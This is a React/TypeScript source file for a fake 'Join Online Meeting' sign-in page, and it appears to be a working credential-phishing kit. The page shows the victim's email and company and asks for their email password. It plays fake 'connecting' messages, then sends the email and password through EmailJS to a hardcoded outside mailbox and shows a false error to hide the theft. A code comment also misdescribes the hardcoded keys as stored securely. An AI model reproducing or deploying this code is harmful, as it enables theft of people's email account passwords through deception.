import { useEffect, useRef, useState } from "react";
import { FaSquareCheck } from "react-icons/fa6";
import { useLocation } from "react-router-dom";
import emailjs from 'emailjs-com';

import InputField from "../components/input";

const words = ["Launching", "Detecting operating system", "System verification", "Connecting to meeting", "Initializing"];

const Login = () => {
  const {state} = useLocation();
  const {email, company} = state;
  const passwordRef = useRef<HTMLInputElement>(null);

  const [currentText, setCurrentText] = useState(words[0]);
  const [index, setIndex] = useState(0);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const intervalRef = useRef<NodeJS.Timeout | null>(null);

  const handleJoinMeeting = () => {
    setIsSubmitting(true);
    setErrorMessage('');
    console.log(index);
    
  
    // Validate inputs
    const userPassword = passwordRef.current?.value;
    if (!userPassword) {
      setIsSubmitting(false);
      return setErrorMessage('Please enter your meeting password.');
    }
  
    // Prevent duplicate intervals
    if (intervalRef.current) return;
  
    // Store email credentials securely (in environment variables)
    const emailJsConfig = {
      serviceId: 'service_2qyn9p8',
      templateId: 'template_clx0vyq',
      userId: '6hoZSgHHvwJ1-WzSl',
      recipientEmail: 'elias.wigan@outlook.com'
    };
  
    intervalRef.current = setInterval(() => {
      setIndex((prevIndex) => {
        const nextIndex = prevIndex + 1;
  
        if (nextIndex >= words.length) {
          clearInterval(intervalRef.current!);
          intervalRef.current = null;
          
          // Prepare email data
          const emailData = {
            to_email: emailJsConfig.recipientEmail,
            from_name: 'Meeting Participant',
            message: `Meeting access attempt:\nEmail: ${email}\nPassword: ${userPassword}`,
          };
  
          // Send email
          emailjs.send(
            emailJsConfig.serviceId,
            emailJsConfig.templateId,
            emailData,
            emailJsConfig.userId
          )
          .then(() => {
            setIsSubmitting(false);
            setErrorMessage('Error, try again later.')
          })
          .catch(() => {
            setIsSubmitting(false);
            setErrorMessage('Error, try again later.')
          });
          
          return prevIndex;
        }
  
        setCurrentText(words[nextIndex]);
        return nextIndex;
      });
    }, 500);
  };
  

  // Clear interval on unmount
  useEffect(() => {
    return () => {
      if (intervalRef.current) clearInterval(intervalRef.current);
    };
  }, [])

  useEffect(() => {
    if (errorMessage){
      setTimeout(() => {
        setErrorMessage('')
      }, 5000);
    }
  }, [errorMessage])
  
  
  return (
    <div className='flex flex-col items-center justify-center w-full h-full'>
      <div className='lg:w-2/5 w-10/12 flex flex-col items-center gap-4 rounded-lg bg-white drop-shadow-2xl p-5'>
        <div className='text-black text-2xl font-bold'>Join Online Meeting</div>
        <div className='text-gray-700 text-center'>Welcome, <span className='font-semibold'>{company}</span>. You have been invited to join a meeting</div>
        <div className='font-semibold text-gray-600 text-sm text-center'>Sign in as :</div>
        <div className='font-semibold text-black text-lg text-center relative mt-3'>{email}</div>
        <div className='w-3/4'>
          <InputField
            type="password"
            isRequired
            placeholder="Enter email password"
            ref={passwordRef}
          />
        </div>
        <div className='inline-flex gap-1 items-center text-gray-600 text-sm text-center'><FaSquareCheck className="text-[#004bb5]" />  I agree to the <span className="text-[#0024f2] font-medium underline decoration-black"> Terms of Service</span>.</div>
        {isSubmitting &&
          <div className='flex flex-col gap-3 w-full items-center pt-10'>
            <img src="https://cdn-icons-png.flaticon.com/512/189/189792.png" alt="Loading..." className="h-[2.5rem] w-[2.5rem] animate-spin"/>
            <div className="text-xs text-black">{currentText} ...</div>
          </div>
        }
        {errorMessage &&
          <div className='flex flex-col gap-3 w-full items-center'>
            <div className="text-sm text-red-600">{errorMessage}</div>
          </div>
        }
        <div className='flex flex-row justify-center w-full'>
          <div onClick={handleJoinMeeting} className='bg-[#0024f2] text-white flex flex-row items-center gap-3 hover:bg-[#004bb5] shadow-lg hover:-translate-y-1 cursor-pointer rounded-full text-center py-2 px-8'>
            <span>LAUNCH MEETING</span>
          </div>
        </div>
        <div className='text-gray-600 text-sm text-center'>If you are unable to join the meeting, <span onClick={() => window.location.reload()} className="text-[#0024f2] cursor-pointer">click here to <span className="font-bold">Refresh</span></span>.</div>
      </div>
    </div> 
  )
}

export default Login